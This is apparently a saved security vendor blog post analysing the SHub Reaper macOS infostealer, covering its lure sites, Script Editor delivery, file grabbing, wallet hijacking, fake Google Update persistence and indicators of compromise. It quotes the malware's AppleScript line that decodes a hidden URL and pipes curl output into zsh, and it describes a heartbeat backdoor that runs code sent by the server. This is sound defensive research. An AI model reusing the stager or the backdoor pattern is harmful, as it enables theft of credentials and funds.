---

title: "SHub Reaper: macOS Stealer Spoofs Apple, Google, and Microsoft in a Single Attack Chain"
type: raw
tags: [macos, malware, stealer, apple, security]
source: newsletter
source_url: https://www.sentinelone.com/blog/shub-reaper-macos-stealer-spoofs-apple-google-and-microsoft-in-a-single-attack-chain
published: 2026-05-20
ingested: 2026-05-20
sha256: 45e3485e4799a113

---
Published Time: 2026-05-18T13:00:42+00:00
Markdown Content:
Infostealers targeting macOS have continued to proliferate over the last two years, with threat actors iterating on successful techniques across related malware families. Researchers at Moonlock, Jamf, and Malwarebytes have previously documented the rise of SHub Stealer, including its use of fake application installers and “ClickFix” social engineering. This week, SentinelOne observed a new SHub variant using the build tag “Reaper”.
Reaper uses fake WeChat and Miro installers as lures, but what stands out is the way the infection chain shifts its disguise at each stage. The payload may be hosted on a typo-squatted Microsoft domain, executed under the guise of an Apple security update, and persist from a fake Google Software Update directory. Alongside the previously documented SHub feature set, the build also adds an AMOS-style document theft module with chunked uploads.
In this post, we examine the Reaper variant’s delivery chain, file-grabbing capability, and persistence strategy, and provide indicators of compromise to aid defenders.
## Delivery Pipeline and Environment Checks
Consistent with earlier SHub builds, the Reaper malware is deployed via a multi-stage execution chain. However, rather than relying on standard “ClickFix” social engineering in which victims are tricked into pasting a command into Terminal, this variant uses a delivery mechanism that bypasses Terminal entirely and sidesteps [Apple’s Tahoe 26.4 mitigation](https://x.com/malwarezoo/status/2037305551911014760?s=20) for those attack flows.
Reaper leverages the `applescript://` URL scheme to launch the macOS Script Editor, pre-populated with the malicious payload. SentinelOne previously [described](https://www.sentinelone.com/blog/the-good-the-bad-and-the-ugly-in-cybersecurity-week-15-7/#:~:text=SentinelOne%20researchers%20discovered,copy%2Dpaste%20involved.) the technique, and [Jamf](https://www.jamf.com/blog/clickfix-macos-script-editor-atomic-stealer/) later documented its use in a similar campaign.
In this case, the HTML source shows the script being constructed dynamically and padded with ASCII art and fake terms so that the malicious command is pushed well below the visible portion of the window when it loads in the host’s Script Editor.app.
![Image 1: HTML source code showing the construction of the malicious AppleScript](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_3.jpg)
HTML source code showing the construction of the malicious AppleScript
When the victim clicks ‘Run’, the embedded AppleScript prints a fake update message referencing Apple’s XProtectRemediator tool while silently decoding and executing a `curl` command to fetch the initial shell script stub.
const hiddenCommand = `do shell script \
"echo 'Downloading Update: https://support.apple.com/downloads/xprotect-remediator-150.dmg' \ && curl -s $(echo 'aHR0cHM6Ly…<redacted>' | base64 -d) | zsh"`;
The script stub then checks the victim’s locale settings by querying the `com.apple.HIToolbox.plist` file to check for Russian input sources.
if defaults read ~/Library/Preferences/com.apple.HIToolbox.plist \
AppleEnabledInputSources 2>/dev/null | grep -qi russian; then 
  IS_CIS="true"
fi
If the host appears to be in the CIS (Commonwealth of Independent States) region, the malware sends a `cis_blocked` telemetry event to its command and control (C2) server and exits. Otherwise, it retrieves an AppleScript containing the core exfiltration logic and executes without touching the local disk via `osascript`.
## Web Telemetry and Anti-Analysis Evasion
The fake WeChat and Miro installer websites are not merely static lures. Before invoking the AppleScript payload, they profile the visitor and apply several anti-analysis techniques. These campaigns are hosted on domains designed to deceive, notably including the typo-squatted URL `mlcrosoft[.]co[.]com`.
JavaScript on the pages collects system and browser information including IP address, location, WebGL fingerprinting data, and indicators of virtual machines or VPNs.
![Image 2: Fingerprinting the webpage visitor’s device for evidence of Virtual machines and VPNs](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_5.jpg)
Fingerprinting the webpage visitor’s device for evidence of Virtual machines and VPNs
The scripts also enumerate installed browser extensions, specifically looking for password managers like 1Password, Bitwarden, and LastPass, as well as cryptocurrency wallets such as MetaMask and Phantom.
![Image 3: The HTML source code looks for specific extensions related to passwords and cryptocurrency](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_1.jpg)
The HTML source code looks for specific extensions related to passwords and cryptocurrency
The collected telemetry, including browser extension data, is sent to the operators via a hardcoded Telegram bot.
The pages also interfere with analysis by overriding `console` functions, intercepting developer keystrokes such as F12, and running a continuous debugger loop to stall analysis. If a researcher opens DevTools, the browser will constantly pause execution, making it difficult to effectively step through the code. In the event the researcher works around these anti-analysis measures, a separate event listener `devtoolschange` overwrites the page content with a Russian “Access Denied” message (`<h1>Доступ запрещен</h1>`).
![Image 4: The HTML source code contains a full suite of anti-analysis measures](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_4.jpg)
The HTML source code contains a full suite of anti-analysis measures
## Exfiltration Engine and Filegrabber Integration
Once the user clicks ‘Run’ in Script Editor, the hidden command retrieves the remote AppleScript and executes it. The user is asked to supply their login password, which is [scraped and used to decrypt various credentials](https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/), before being presented with a misleading error message.
![Image 5: AppleScript password dialog allows the attacker to scrape the user password](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_9.jpg)
AppleScript password dialog allows the attacker to scrape the user password
![Image 6: Reaper presents the user with a fake error message to distract suspicion](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_8.jpg)
Reaper presents the user with a fake error message to distract suspicion
Earlier SHub builds focused on harvesting browser data, cryptocurrency wallets, developer-related configuration files, the macOS Keychain and iCloud account data, along with Telegram session data.
![Image 7: SentinelOne Singularity captures how Reaper targets the user’s login keychain, among other things](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_6.jpg)
SentinelOne Singularity captures how Reaper targets the user’s login keychain, among other things
Reaper’s AppleScript retains that core behavior, targeting data from Chrome, Firefox, Brave, Edge, Opera, Vivaldi, Arc, and Orion, as well as browser extensions and desktop wallet applications including Exodus, Atomic, Ledger Live, Electrum, and Trezor Suite.
In addition, the Reaper build includes a Filegrabber routine resembling the document-theft functionality seen in [Atomic macOS Stealer](https://www.sentinelone.com/blog/from-amos-to-poseidon-a-soc-teams-guide-to-detecting-macos-atomic-stealers-2024/) (AMOS). The Filegrabber handler searches the user’s Desktop and Documents folders for files likely to contain business or financial value.
The script targets files with the extensions `.docx`, `.doc`, `.wallet`, `.key`, `.keys`, `.txt`, `.rtf`, `.csv`, `.xls`, `.xlsx`, `.json`, and `.rdp` files under 2MB, along with `.png` images under 6MB, with a total collection cap of 150MB.
![Image 8: The AppleScript Filegrabber handler is similar to that used by AMOS Atomic and other macOS infostealers](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_10.jpg)
The AppleScript Filegrabber handler is similar to that used by AMOS Atomic and other macOS infostealers
Collected files are staged in `/tmp/shub_<random>/`, after which the script checks whether the directory exceeds 85MB. If it does, Reaper generates a Bash script at `/tmp/shub_split.sh` to divide the archive into 70MB ZIP chunks and upload them sequentially to the C2 at `hebsbsbzjsjshduxbs[.]xyz/gate/chunk` via `curl`.
## Wallet Application Hijacking
After uploading the user’s data, the malware attempts to compromise specific cryptocurrency desktop wallets to intercept future activity.
The script searches for Exodus, Atomic Wallet, Ledger Wallet, Ledger Live, and Trezor Suite. When found, it retrieves a modified `app.asar` file from the C2 server, terminates the active wallet process, and replaces the legitimate core application file.
![Image 9: Wallet injection for continued funds theft](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_7.jpg)
Wallet injection for continued funds theft
To bypass Gatekeeper, the script clears the quarantine attributes with `xattr -cr` and uses _ad hoc_ code signing on the modified application bundle.
## LaunchAgent Persistence and Backdoor
While many macOS infostealers operate solely on initial execution, the SHub Reaper variant establishes persistence and installs a backdoor. Before terminating, the AppleScript creates a directory structure designed to mimic Google Software Update: `~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/`.
It places a Base64-decoded bash script named `GoogleUpdate` in this directory and registers it using a LaunchAgent property list named `com.google.keystone.agent.plist`.
![Image 10: User LaunchAgent masquerades as Google software update](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_11.jpg)
User LaunchAgent masquerades as Google software update
The LaunchAgent executes the target script `GoogleUpdate` every 60 seconds. The script functions as a beacon, sending system details to the C2’s `/api/bot/heartbeat` endpoint.
![Image 11: GoogleUpdate provides the attacker with a backdoor](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_12.jpg)
_GoogleUpdate_ provides the attacker with a backdoor
If the server returns a `"code"` payload, the script decodes it, writes it to a hidden `/tmp/.c.sh` file, executes it with the current user’s privileges, and then deletes the file. The mechanism provides the threat actor with a persistent backdoor for remote code execution.
## SentinelOne Customers Are Protected from SHub Reaper
One of the core reasons attackers have moved to attack flows that leverage AppleScript and shell scripts is their ability to confine execution to running system processes or user-initiated processes like Script Editor or the Terminal. This allows the attacker to execute without introducing foreign binaries to the file system and makes it easier to bypass file scanning detection tools like Apple’s own XProtect and similar 3rd party tools.
SentinelOne Singularity detects SHub Reaper’s attempts to exfiltrate data and to enable persistence, among other behaviours. The engine does not rely on file scanning or signature updates to detect this kind of malicious behaviour, regardless of its source.
![Image 12: Singularity detects Reaper’s malicious behavior](https://www.sentinelone.com/wp-content/uploads/2026/05/SHub_reaper_2.jpg)
Singularity detects Reaper’s malicious behavior
## Conclusion
The Reaper build shows that SHub operators are extending their malware beyond straightforward credential and wallet theft. Alongside an AMOS-style Filegrabber and chunked uploads, the variant also installs a persistent backdoor, giving the operators more ways to steal data or pivot to other malicious installs after the initial compromise.
macOS users should take note of the way the infection chain layers familiar brands and trusted software cues across multiple stages: A fake WeChat or Miro installer, delivery from a typo-squatted Microsoft domain, execution disguised as an Apple security update, and persistence hidden in a fake Google Software Update path.
For defenders, that combination reinforces the need to watch for malicious behavior like unexpected AppleScript or osascript activity, suspicious outbound traffic following Script Editor execution, or the unexpected creation of LaunchAgents or related files in namespaces associated with trusted vendors.
## Indicators of Compromise
### Network Communications
hebsbsbzjsjshduxbs[.]xyz Primary C2
hxxps[://]hebsbsbzjsjshduxbs[.]xyz/api/debug/event C2 Endpoint
hxxps[://]hebsbsbzjsjshduxbs[.]xyz/api/bot/heartbeat C2 Endpoint
hxxps[://]hebsbsbzjsjshduxbs[.]xyz/gate C2 Endpoint
qq-0732gwh22[.]com Fake WeChat Lure Domain
mlcrosoft[.]co[.]com Fake WeChat Lure Domain
mlroweb[.]com Fake Miro Lure Domain
### File System Paths
**Filepath****Purpose**
~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate Backdoor Binary
~/Library/LaunchAgents/com.google.keystone.agent.plist Persistence mechanism
/tmp/shub_log.zip Staged exfiltration archive
/tmp/shub_split.sh Archive splitting utility
/tmp/shub_mzip_*.zip Segmented archive chunks
/tmp/.c.sh Ephemeral backdoor execution script
/tmp/*_asar.zip Downloaded wallet payloads, e.g., exodus_asar.zip, ledger_asar.zip
### Static Strings & Identifiers
Build ID 6552824c59ddacb134073f24a4bd4724514a938a9dc59f1733503642faed3bd3
Build Name Reaper
Hardcoded Build Hash c917fcf8314228862571f80c9e4a871e